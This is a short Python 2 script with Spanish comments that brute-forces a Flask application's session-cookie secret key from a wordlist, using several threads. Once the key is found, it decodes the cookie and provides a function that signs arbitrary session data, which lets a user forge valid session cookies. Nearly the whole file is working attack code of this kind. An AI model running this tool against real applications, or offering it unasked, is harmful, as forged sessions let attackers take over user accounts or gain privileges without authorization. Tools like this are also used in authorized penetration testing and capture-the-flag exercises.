#-*- coding: utf-8 -*-

import sys
import signal
import time
from threading import Thread
from flask import sessions

terminar = False
cracked = dict() # Diccionario que contiene la clave secreta para cada cookie
threads = 2

class Config(object):
    def __init__(self, key):
        """ Le doy un atributo secret_key a la instancia de la 
        clase """
        self.secret_key = key

def signal_handler(signal, frame):
    global terminar
    print 'Terminando'
    terminar = True

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def crack(cookie, wordlist):
    """ Intenta crackear la cookie usando una lista con posibles
    valores para clave. Cuando la encuentra la agrega a cracked """
    interface = sessions.SecureCookieSessionInterface()
    for word in wordlist:
        if terminar:
            break
        config = Config(word)
        serializer = interface.get_signing_serializer(config)
        try:
            serializer.loads(cookie)
        except:
            # Clave incorrecta
            pass
        else:
            # Clave correcta
            cracked[cookie] = word
            break

def thread_crack(cookie, wordlist, threads):
    global terminar
    """ Crackea la cookie en la cantidad de threads especificados.
    Retorna la clave secreta de la cookie"""
    for i in range(threads):
        wl = wordlist[i::threads] # Wordlist para cada hilo
        Thread(target = crack, args=(cookie, wl)).start()

    while not terminar:
        if cookie in cracked:
            terminar = True
            return cracked[cookie]

def loads(secret_key, cookie):
    """ Retorna el contenido de la cookie decodificado """
    interface = sessions.SecureCookieSessionInterface()
    config = Config(secret_key)
    serializer = interface.get_signing_serializer(config)
    return serializer.loads(cookie)

def dumps(secret_key, obj):
    """ Retorna una cookie de sesión válida con los datos indicados
    en obj """
    interface = sessions.SecureCookieSessionInterface()
    config = Config(secret_key)
    serializer = interface.get_signing_serializer(config)
    return serializer.dumps(obj)

def main():
    if not len(sys.argv) == 3:
        print 'Uso: ./%s <wordlist_file> <cookie_value>'
        sys.exit()
    inicio = time.time()
    wordlist_file, cookie = sys.argv[1:]
    wordlist = open(wordlist_file).readlines()
    wordlist = [w.strip() for w in wordlist]
    secret_key = thread_crack(cookie, wordlist, threads)
    if secret_key:
        print 'Crackedo. Clave:', secret_key
        print 'Decodificado:', loads(secret_key, cookie)
        print 'Terminado en', time.time() - inicio, 'segundos'

if __name__ == '__main__':
    main()
